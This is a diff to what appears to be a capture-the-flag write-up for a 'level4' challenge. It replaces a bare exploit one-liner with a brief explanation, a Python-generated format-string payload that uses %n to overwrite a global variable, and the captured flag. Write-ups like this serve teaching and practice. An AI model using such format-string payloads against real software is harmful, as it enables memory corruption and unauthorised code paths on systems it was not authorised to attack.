@@ -1,2 +1,7 @@
-python -c "print '\x10\x98\x04\x08%4\$16930112d'+'%12\$n'" > /tmp/level5
-cat /tmp/level5 - | ./level4
+similar to the previous level, we call printf dirctly on the user input, but here we compare the global variable to a big value
+and if the check passes then the program try to cat the flag using system call
+
+again we try to find where is the vraible located in printf args and we set it to this big value using %n and using printf flag modifiers (%16930112d will print 16930112 character)
+
+~$ ./level4 <<< $(python -c "print '\x10\x98\x04\x08%4\$16930112d'+'%12\$n'")
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
